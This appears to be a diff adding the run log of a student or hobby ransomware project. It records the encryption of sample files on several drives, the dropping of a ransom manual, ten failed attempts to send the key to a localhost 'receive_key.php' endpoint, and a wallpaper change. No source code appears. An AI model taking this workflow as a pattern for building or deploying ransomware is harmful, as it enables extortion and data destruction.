@@ -1,0 +1,50 @@
+2025-03-18 01:05:13,095:INFO:Key generated successfully.
+2025-03-18 01:05:13,095:INFO:Processing drive F:
+2025-03-18 01:05:13,117:INFO:Created important files in 'F:D-Data'.
+2025-03-18 01:05:13,156:INFO:Encrypted F:D-Data\Annual_Report_2022.docx
+2025-03-18 01:05:13,160:INFO:Encrypted F:D-Data\Employee_Contacts.pdf
+2025-03-18 01:05:13,165:INFO:Encrypted F:D-Data\Financials_Q3.xlsx
+2025-03-18 01:05:13,165:INFO:All files in F: encrypted successfully.
+2025-03-18 01:05:13,165:INFO:User manual created successfully.
+2025-03-18 01:05:13,166:INFO:Machine ID saved successfully to F:Machine_id.txt.
+2025-03-18 01:05:13,166:INFO:Processing drive E:
+2025-03-18 01:05:13,172:INFO:Created important files in 'E:D-Data'.
+2025-03-18 01:05:13,230:INFO:Encrypted E:D-Data\Annual_Report_2022.docx
+2025-03-18 01:05:13,231:INFO:Encrypted E:D-Data\Employee_Contacts.pdf
+2025-03-18 01:05:13,232:INFO:Encrypted E:D-Data\Financials_Q3.xlsx
+2025-03-18 01:05:13,232:INFO:All files in E: encrypted successfully.
+2025-03-18 01:05:13,232:INFO:User manual created successfully.
+2025-03-18 01:05:13,232:INFO:Machine ID saved successfully to E:Machine_id.txt.
+2025-03-18 01:05:13,232:INFO:Processing drive D:
+2025-03-18 01:05:13,234:INFO:Created important files in 'D:D-Data'.
+2025-03-18 01:05:13,236:INFO:Encrypted D:D-Data\Annual_Report_2022.docx
+2025-03-18 01:05:13,245:INFO:Encrypted D:D-Data\Employee_Contacts.pdf
+2025-03-18 01:05:13,246:INFO:Encrypted D:D-Data\Financials_Q3.xlsx
+2025-03-18 01:05:13,246:INFO:All files in D: encrypted successfully.
+2025-03-18 01:05:13,246:INFO:User manual created successfully.
+2025-03-18 01:05:13,247:INFO:Machine ID saved successfully to D:Machine_id.txt.
+2025-03-18 01:05:13,249:INFO:Encryption key saved locally to E:encryption_key.txt.
+2025-03-18 01:05:13,249:INFO:Encryption key saved locally.
+2025-03-18 01:05:13,249:INFO:Attempt 1 to send encryption key.
+2025-03-18 01:05:17,289:ERROR:Connection error on attempt 1: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C34EA76E0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:05:22,290:INFO:Attempt 2 to send encryption key.
+2025-03-18 01:05:26,327:ERROR:Connection error on attempt 2: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C34EA7EF0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:05:31,328:INFO:Attempt 3 to send encryption key.
+2025-03-18 01:05:35,382:ERROR:Connection error on attempt 3: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C3528C6E0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:05:40,383:INFO:Attempt 4 to send encryption key.
+2025-03-18 01:05:44,426:ERROR:Connection error on attempt 4: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C34EA7D40>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:05:49,427:INFO:Attempt 5 to send encryption key.
+2025-03-18 01:05:53,459:ERROR:Connection error on attempt 5: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C34EA6C90>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:05:58,460:INFO:Attempt 6 to send encryption key.
+2025-03-18 01:06:02,495:ERROR:Connection error on attempt 6: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C3528C350>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:06:07,496:INFO:Attempt 7 to send encryption key.
+2025-03-18 01:06:11,534:ERROR:Connection error on attempt 7: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C3528CF20>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:06:16,535:INFO:Attempt 8 to send encryption key.
+2025-03-18 01:06:20,573:ERROR:Connection error on attempt 8: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C3528D7C0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:06:25,574:INFO:Attempt 9 to send encryption key.
+2025-03-18 01:06:29,603:ERROR:Connection error on attempt 9: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C3528E120>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:06:34,604:INFO:Attempt 10 to send encryption key.
+2025-03-18 01:06:38,650:ERROR:Connection error on attempt 10: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /prjrans/includes/api/receive_key.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000028C34EA7C20>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
+2025-03-18 01:06:38,650:ERROR:All attempts to send the key failed.
+2025-03-18 01:06:38,650:ERROR:Failed to send encryption key.
+2025-03-18 01:06:38,651:INFO:Wallpaper set successfully to c:\Users\d0ngle\Desktop\Simple-Ransomware-\rans\img/wallpaper.png.
